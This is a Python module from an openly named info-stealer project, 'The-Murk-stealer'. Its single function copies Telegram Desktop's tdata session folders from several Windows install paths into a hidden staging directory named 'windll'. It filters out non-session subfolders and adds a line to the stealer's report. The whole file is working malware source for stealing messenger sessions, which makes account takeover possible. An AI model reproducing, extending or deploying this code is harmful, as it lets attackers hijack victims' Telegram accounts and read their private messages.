#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

from os import getenv
from shutil import copytree,ignore_patterns
from manager.logger import Log

def Telegram():
    msgInfo = ""
    roaming = getenv('APPDATA')
    pathToLogs = f"{getenv('LOCALAPPDATA')}\\windll\\Messengers\\Telegram"
    dirs=[
        roaming+"\\Telegram Desktop\\tdata",
        'D:\\Telegram Desktop\\tdata',
        'C:\\Program Files\\Telegram Desktop\\tdata'
    ]
    try:
        for dir in dirs:
            copytree(dir,pathToLogs,ignore = ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
    except Exception as e:
        Log(f"Telegram {dir} ---> {e}")
    msgInfo+="\n∟📨Telegram"
    return msgInfo